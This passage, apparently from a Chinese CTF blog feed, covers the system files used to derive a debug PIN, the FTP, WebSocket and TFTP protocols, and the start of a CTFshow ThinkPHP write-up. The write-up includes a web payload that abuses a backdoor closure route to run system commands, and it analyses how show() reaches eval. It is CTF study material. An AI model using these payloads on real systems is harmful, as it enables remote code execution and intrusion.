group_size<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">break</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        rv <span class="token operator">=</span> num<span class="token keyword">print</span><span class="token punctuation">(</span>rv<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>总之需要的文件就是</p><blockquote><p>/sys/class/net/eth0/address</p><p>/etc/machine-id</p><p>/proc/sys/kernel/random/boot_id</p><p>/proc/self/cgroup</p><p>必要的就是machine-id，没有的话就用boot_id代替</p></blockquote>        <h2 id="奇怪的协议"   >          <a href="#奇怪的协议" class="heading-link"><i class="fas fa-link"></i></a><a href="#奇怪的协议" class="headerlink" title="奇怪的协议"></a>奇怪的协议</h2>      <p>众所周知啊，现在网络传输有非常多的协议，打CTF呢最近越来越没有什么正常的http协议了，所以准备写一个小小的文章稍微总结一下各种奇怪协议，万一以后用的到呢～～～</p>        <h3 id="FTP"   >          <a href="#FTP" class="heading-link"><i class="fas fa-link"></i></a><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h3>      <p>FTP协议是互联网上广泛使用的文件传输协议</p><p>客户端/服务器模式，基于TCP协议</p><p>采用双TCP连接方式</p><ul><li>控制连接默认使用TCP端口号21，控制连接在整个会话期间都会保持打开</li><li>数据连接默认使用TCP端口号20，数据连接在传输文件时打开，文件传输结束，连接终止</li></ul><p>FTP有两种文件传输模式</p><ul><li>ASCII模式是默认的文件传输模式，会将文件转为标准ASCII码再进行传输</li><li>二进制模式又称图像文件传输模式，文件会按照比特流的方式进行传输</li></ul><p>FTP采用两种数据传输方式</p><ul><li><p>主动（Standard）方式，又称为PORT方式，客户端首先向服务端发送PORT命令，告诉服务器用于数据传输的临时端口号，当进行数据传输时，由服务器向客户端指定端口发起连接，由于是服务器发起连接，所以叫主动方式，</p><p>FTP服务器必须和客户端建立一个新的连接用来传送数据。</p></li><li><p>被动（Passive）方式，又称为PASV方式，服务器收到PASV命令后随即打开一个高端（大于1024）端口，并通知客户端在这个端口上传送数据，由客户端向服务端的指定端口发起连接，所以叫被动方式</p><p>FTP服务器不再需要建立一个新的和客户端之间的连接。</p></li></ul><p>FTP中的命令和应答：命令和应答在客户和服务器的控制连接上以 NVT ASCII码形式传送。这就要求在每行结尾都要返回C R、 L F对（也就是每个命令或每个应答）。这些命令都是3或4个字节的大写ASCII字符，其中一些带选项参数。下面是一些命令（来自客户端）</p><div class="table-container"><table><thead><tr><th>命令</th><th>说明</th></tr></thead><tbody><tr><td><code>ABOR</code></td><td>放弃先前的FTP命令与数据传输</td></tr><tr><td><code>LIST filename</code></td><td>列表显示文件或目录</td></tr><tr><td><code>USER username</code></td><td>服务器上的用户名</td></tr><tr><td><code>PASS password</code></td><td>服务器上的口令</td></tr><tr><td><code>PORT n1,n2,n3,n4,n5,n6</code></td><td>客户端的IP地址与端口（n1.n2.n3.n4:n5*256+n6）</td></tr><tr><td><code>QUIT</code></td><td>注销</td></tr><tr><td><code>RETR filename</code></td><td>检索一个文件</td></tr><tr><td><code>STOR filename</code></td><td>存储一个文件</td></tr><tr><td><code>SYST</code></td><td>从服务器返回系统编码类型</td></tr><tr><td><code>TYPE typeUSER</code></td><td>说明文件传输模式：A表示ASCII码，I表示比特流</td></tr></tbody></table></div><p>而FTP的应答都是ASCII码形式的三位数字，并且跟有报文来帮助人工处理，这里是一些有用的<span class="exturl"><a class="exturl__link"   href="https://blog.csdn.net/cbffyx/article/details/78891603" >响应数据</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><div class="table-container"><table><thead><tr><th>应答</th><th>说明</th></tr></thead><tbody><tr><td>1yz</td><td>肯定预备应答，在发送另一个命令前期待另一个应答时启动</td></tr><tr><td>2yz</td><td>肯定完成应答，一个新命令可以发送</td></tr><tr><td>3yz</td><td>肯定中介应答，该命令已被应答，但另一个命令必须被发送</td></tr><tr><td>4yz</td><td>暂态否定完成应答，请求动作未发生，但差错是暂时的，命令可以过后再发</td></tr><tr><td>5yz</td><td>永久性否定完成应答，命令不被接受并且不再进行重试</td></tr><tr><td>x0z</td><td>语法错误</td></tr><tr><td>x1z</td><td>信息</td></tr><tr><td>x2z</td><td>连接，应答指控制或数据连接</td></tr><tr><td>x3z</td><td>鉴别和记账，应答用于注册或记账命令</td></tr><tr><td>x4z</td><td>未指明</td></tr><tr><td>x5z</td><td>文件系统状态</td></tr></tbody></table></div><p>下面是一次正常的FTP连接的双方数据交互的过程</p><pre class="line-numbers language-none"><code class="language-none">响应: 220 (vsFTPd 3.0.2)命令: AUTH TLS响应: 530 Please login with USER and PASS.命令: AUTH SSL响应: 530 Please login with USER and PASS.状态: 不安全的服务器，不支持 FTP over TLS。命令: USER test响应: 331 Please specify the password.命令: PASS ****响应: 230 Login successful.命令: OPTS UTF8 ON响应: 200 Always in UTF8 mode.命令: CWD &#x2F;响应: 250 Directory successfully changed.命令: PWD响应: 257 &quot;&#x2F;&quot;命令: TYPE A响应: 200 Switching to ASCII mode.命令: PASV响应: 227 Entering Passive Mode (172,17,0,6,82,117).命令: STOR main.py响应: 150 Ok to send data.响应: 226 Transfer complete.命令: TYPE I响应: 200 Switching to Binary mode.命令: PASV响应: 227 Entering Passive Mode (172,17,0,6,82,111).命令: LIST响应: 150 Here comes the directory listing.响应: 226 Directory send OK.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>        <h3 id="WEBSOCKET"   >          <a href="#WEBSOCKET" class="heading-link"><i class="fas fa-link"></i></a><a href="#WEBSOCKET" class="headerlink" title="WEBSOCKET"></a>WEBSOCKET</h3>      <p>HTTP协议有一个的缺陷为：通信只能由客户端发起。在一些场景下，这种单向请求的特点，注定了如果服务器有连续的状态变化，客户端要获知就非常麻烦。我们只能使用<span class="exturl"><a class="exturl__link"   href="https://so.csdn.net/so/search?q=%E8%BD%AE%E8%AF%A2&spm=1001.2101.3001.7020" >轮询</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>：每隔一段时候，就发出一个询问，了解服务器有没有新的信息。轮询效率低切浪费资源，此时，websocket就被发明了</p><p>Webscoket是Web浏览器和服务器之间的一种全双工通信协议，其中WebSocket协议由IETF定为标准，WebSocket API由W3C定为标准。一旦Web客户端与服务器建立起连接，之后的全部数据通信都通过这个连接进行。通信过程中，可互相发送JSON、XML、HTML或图片等任意格式的数据。</p><p>与HTTP的相同点：</p><ul><li>都是基于TCP的应用层协议</li><li>都使用Request/Response模型进行连接的建立</li><li>在连接的建立过程中对错误的处理方式相同，在这个阶段WS可能返回和HTTP相同的返回码</li></ul><p>不同之处在于：</p><ul><li>WS使用HTTP来建立连接，但是定义了一系列新的header域，这些域在HTTP中并不会使用</li><li>WS的连接不能通过中间人来转发，它必须是一个直接连接</li><li>WS连接建立之后，通信双方都可以在任何时刻向另一方发送数据</li><li>WS连接建立之后，数据的传输使用帧来传递，不再需要Request消息</li><li>WS的数据帧有序</li></ul><p><img src="https://img-blog.csdnimg.cn/20200527233222508.png" alt="img"></p><p>这里是一个完整的websocket的过程数据流</p><pre class="line-numbers language-none"><code class="language-none">GET &#x2F; HTTP&#x2F;1.1Host: localhost:3000Pragma: no-cacheAccept: *&#x2F;*Sec-WebSocket-Key: bI1MuDR3aJuRuf8JYLkqVw&#x3D;&#x3D;Sec-WebSocket-Version: 13Accept-Language: zh-CN,zh-Hans;q&#x3D;0.9Sec-WebSocket-Extensions: permessage-deflateCache-Control: no-cacheAccept-Encoding: gzip, deflateOrigin: nullUser-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit&#x2F;605.1.15 (KHTML, like Gecko) Version&#x2F;15.5 Safari&#x2F;605.1.15Connection: UpgradeUpgrade: websocketHTTP&#x2F;1.1 101 Switching ProtocolsUpgrade: websocketConnection: UpgradeSec-WebSocket-Accept: NLLgtF7B4DX8+2TpfNbpeL&#x2F;vprw&#x3D;..&quot;c_.Z&gt;.Q..ECHO: xiaosi..&quot;|.xZ...Q...ECHO: xiaosi..h..J...%....ECHO: xiaosi....L...-.....ECHO: xiaosi...+~L.B.#.B..ECHO: xiaosi..d...........ECHO: xiaosi........t.....ECHO: xiaosi..F...&gt;...5...ECHO: xiaosi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>第一行为为请求的方法，类型必须为GET，协议版本号必须大于1.1</li><li>Upgrade字段必须包含，值为websocket</li><li>Connection字段必须包含，值为Upgrade</li><li>Sec-WebSocket-Key字段必须包含 ，记录着握手过程中必不可少的键值。</li><li>Sec-WebSocket-Protocol字段必须包含 ，记录着使用的子协议</li></ul>        <h2 id="TFTP"   >          <a href="#TFTP" class="heading-link"><i class="fas fa-link"></i></a><a href="#TFTP" class="headerlink" title="TFTP"></a>TFTP</h2>      <p>TFTP(Trival File Transfer Protocal，简单文件传输协议）该协议在熟知端口69上使用UDP服务。TFTP协议常用于无盘工作站或路由器从别的主机上获取引导配置文件，由于TFTP报文比较小，能够迅速复制这些文件。</p><p>优点：TFTP协议代码所占用的内存小，其对应的软件也很小，所以能个很容易地放入到无盘工作站的ROM中，TFTP支持ASCII码或二进制传送。</p><p>传输过程</p><p>以TFTP客户向TFTP服务器发送读请求为例，说明整个过程。</p><ol><li>服务器使用熟知端口号69被动打开连接；</li><li>客户主动打开连接，它使用临时端口作为源端口而熟知端口69作为目的端口，向服务器进程发送RRQ报文；</li><li>服务器主动打开连接，它使用新的临时端口作为源端口，而使用收到的来自客户的临时端口作为目的端口，向TFTP客户进程发送DATA报文（2B操作码，2B数据块的块号K，512B数据）；</li><li>客户收到服务器的报文后，发送4B的ACK（2B的操作码和2B的数据块号）给TFTP服务器，告诉它之前发送给客户的数据报已经收到；</li><li>重复步骤3-4，直到所有请求的数据发送完毕。</li></ol><p><img src="https://upload-images.jianshu.io/upload_images/2256198-62dba3beb7cb0353.png" alt="img"></p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CTFshowThinkPHP专题</title>
      <link href="/posts/80a6314c.html"/>
      <url>/posts/80a6314c.html</url>
      
        <content type="html"><![CDATA[        <h1 id="ThinkPHP"   >          <a href="#ThinkPHP" class="heading-link"><i class="fas fa-link"></i></a><a href="#ThinkPHP" class="headerlink" title="ThinkPHP"></a>ThinkPHP</h1>      <p>一些ThinkPHP的基础知识：</p><ol><li><span class="exturl"><a class="exturl__link"   href="https://www.kancloud.cn/manual/thinkphp/1696" >关于ThinkPHP的模块化设计</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li><li><span class="exturl"><a class="exturl__link"   href="https://www.kancloud.cn/manual/thinkphp/1710" >关于ThinkPHP的闭包支持</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li></ol><p><strong>569</strong></p><p>知道模块化设计就很简单了</p><pre class="line-numbers language-none"><code class="language-none">典型访问规则http:&#x2F;&#x2F;serverName&#x2F;index.php（或者其他应用入口文件）&#x2F;模块&#x2F;控制器&#x2F;操作&#x2F;[参数名&#x2F;参数值...]&#x2F;index.php&#x2F;Admin&#x2F;Login&#x2F;ctfshowLogin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>570</strong></p><p>闭包路由，类似于将/后路径作为参数传入，设定闭包路由的文件在文件根目录/Common/Conf/config.php中</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">   <span class="token string single-quoted-string">'URL_ROUTER_ON'</span>   <span class="token operator">=></span> <span class="token constant boolean">true</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'URL_ROUTE_RULES'</span> <span class="token operator">=></span> <span class="token keyword">array</span><span class="token punctuation">(</span>   <span class="token string single-quoted-string">'ctfshow/:f/:a'</span> <span class="token operator">=></span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>   <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span> <span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>一个明显的后门，payload如下</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;index.php&#x2F;ctfshow&#x2F;assert&#x2F;eval($_POST[1])POST:1&#x3D;system(&#39;tac &#x2F;*&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>571</strong></p><p>show方法导致的命令执行</p><blockquote>        <h2 id="渲染内容"   >          <a href="#渲染内容" class="heading-link"><i class="fas fa-link"></i></a><a href="#渲染内容" class="headerlink" title="渲染内容"></a>渲染内容</h2>      <p>如果你没有定义任何模板文件，或者把模板内容存储到数据库中的话，你就需要使用show方法来渲染输出了，show方法的调用格式：</p><pre class="line-numbers language-none"><code class="language-none">show(&#39;渲染内容&#39;[,&#39;字符编码&#39;][,&#39;输出类型&#39;])例如，$this-&gt;show($content);也可以指定编码和类型： $this-&gt;show($content, &#39;utf-8&#39;, &#39;text&#x2F;xml&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></blockquote><p>那么我们去看看show方法到底执行了什么</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function-definition function">show</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span><span class="token variable">$charset</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$contentType</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$prefix</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">view</span><span class="token operator">-></span><span class="token function">display</span><span class="token punctuation">(</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$charset</span><span class="token punctuation">,</span><span class="token variable">$contentType</span><span class="token punctuation">,</span><span class="token variable">$content</span><span class="token punctuation">,</span><span class="token variable">$prefix</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>往下看调用的display方法</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">display</span><span class="token punctuation">(</span><span class="token variable">$templateFile</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$charset</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$contentType</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$content</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$prefix</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">G</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'viewStartTime'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 视图开始标签</span>    <span class="token class-name static-context">Hook</span><span class="token operator">::</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'view_begin'</span><span class="token punctuation">,</span><span class="token variable">$templateFile</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 解析并获取模板内容</span>    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token variable">$templateFile</span><span class="token punctuation">,</span><span class="token variable">$content</span><span class="token punctuation">,</span><span class="token variable">$prefix</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 输出模板内容</span>    <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">render</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span><span class="token variable">$charset</span><span class="token punctuation">,</span><span class="token variable">$contentType</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 视图结束标签</span>    <span class="token class-name static-context">Hook</span><span class="token operator">::</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'view_end'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">fetch</span><span class="token punctuation">(</span><span class="token variable">$templateFile</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$content</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$prefix</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$templateFile</span>   <span class="token operator">=</span>   <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">parseTemplate</span><span class="token punctuation">(</span><span class="token variable">$templateFile</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 模板文件不存在直接返回</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$templateFile</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token function">E</span><span class="token punctuation">(</span><span class="token function">L</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'_TEMPLATE_NOT_EXIST_'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">':'</span><span class="token operator">.</span><span class="token variable">$templateFile</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token function">defined</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'THEME_PATH'</span><span class="token punctuation">)</span> <span class="token keyword">or</span>    <span class="token function">define</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'THEME_PATH'</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">getThemePath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 页面缓存</span>    <span class="token function">ob_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">ob_implicit_flush</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php'</span> <span class="token operator">==</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token function">C</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'TMPL_ENGINE_TYPE'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 使用PHP原生模板</span>        <span class="token variable">$_content</span>   <span class="token operator">=</span>   <span class="token variable">$content</span><span class="token punctuation">;</span>        <span class="token comment">// 模板阵列变量分解成为独立变量</span>        <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">tVar</span><span class="token punctuation">,</span> <span class="token constant">EXTR_OVERWRITE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 直接载入PHP模板</span>        <span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_content</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token keyword">include</span> <span class="token variable">$templateFile</span><span class="token punctuation">:</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'?>'</span><span class="token operator">.</span><span class="token variable">$_content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token comment">// 视图解析标签</span>        <span class="token variable">$params</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'var'</span><span class="token operator">=></span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">tVar</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'file'</span><span class="token operator">=></span><span class="token variable">$templateFile</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'content'</span><span class="token operator">=></span><span class="token variable">$content</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'prefix'</span><span class="token operator">=></span><span class="token variable">$prefix</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name static-context">Hook</span><span class="token operator">::</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'view_parse'</span><span class="token punctuation">,</span><span class="token variable">$params</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 获取并清空缓存</span>    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">ob_get_clean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 内容过滤标签</span>    <span class="token class-name static-context">Hook</span><span class="token operator">::</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'view_filter'</span><span class="token punctuation">,</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 输出模板文件</span>    <span class="token keyword">return</span> <span class="token variable">$content</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在<code>TMPL_ENGINE_TYPE==&#39;php&#39;</code>时，关键就在这句话了<code>include $templateFile:eval(&#39;?&gt;&#39;.$_content);</code>此处的<code>$_content</code>我们是完全可控的，也就可以执行任意命令</p><p>而当<code>TMPL_ENGINE_TYPE!=&#39;php&#39;</code>时，执行的Hook中的listen方法，然后执行exec方法，然后run方法，最后加载并包含一个缓存文件</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">static</span> <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">listen</span><span class="token punctuation">(</span><span class="token variable">$tag</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span><span class="token variable">$params</span><span class="token operator">=</span><span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token variable">$tags</span><span class="token punctuation">[</span><span class="token variable">$tag</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token constant">APP_DEBUG</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">G</span><span class="token punctuation">(</span><span class="token variable">$tag</span><span class="token operator">.</span><span class="token string single-quoted-string">'Start'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">trace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'[ '</span><span class="token operator">.</span><span class="token variable">$tag</span><span class="token operator">.</span><span class="token string single-quoted-string">' ] --START--'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'INFO'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token variable">$tags</span><span class="token punctuation">[</span><span class="token variable">$tag</span><span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token variable">$name</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token constant">APP_DEBUG</span> <span class="token operator">&amp;&amp;</span> <span class="token function">G</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token operator">.</span><span class="token string single-quoted-string">'_start'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$result</span> <span class="token operator">=</span>   <span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$tag</span><span class="token punctuation">,</span><span class="token variable">$params</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token constant">APP_DEBUG</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token function">G</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token operator">.</span><span class="token string single-quoted-string">'_end'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">trace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Run '</span><span class="token operator">.</span><span class="token variable">$name</span><span class="token operator">.</span><span class="token string single-quoted-string">' [ RunTime:'</span><span class="token operator">.</span><span class="token function">G</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token operator">.</span><span class="token string single-quoted-string">'_start'</span><span class="token punctuation">,</span><span class="token variable">$name</span><span class="token operator">.</span><span class="token string single-quoted-string">'_end'</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'s ]'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'INFO'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token constant boolean">false</span> <span class="token operator">===</span> <span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token comment">// 如果返回false 则中断插件执行</span>                <span class="token keyword">return</span> <span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token constant">APP_DEBUG</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 记录行为的执行日志</span>            <span class="token function">trace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'[ '</span><span class="token operator">.</span><span class="token variable">$tag</span><span class="token operator">.</span><span class="token string single-quoted-string">' ] --END-- [ RunTime:'</span><span class="token operator">.</span><span class="token function">G</span><span class="token punctuation">(</span><span class="token variable">$tag</span><span class="token operator">.</span><span class="token string single-quoted-string">'Start'</span><span class="token punctuation">,</span><span class="token variable">$tag</span><span class="token operator">.</span><span class="token string single-quoted-string">'End'</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'s ]'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'INFO'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">public function load($_filename,$vars&#x3D;null)&#123;    if(!is_null($vars))        extract($vars, EXTR_OVERWRITE);    eval(&#39;?&gt;&#39;.$this-&gt;read($_filename));&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最终payload</p><pre 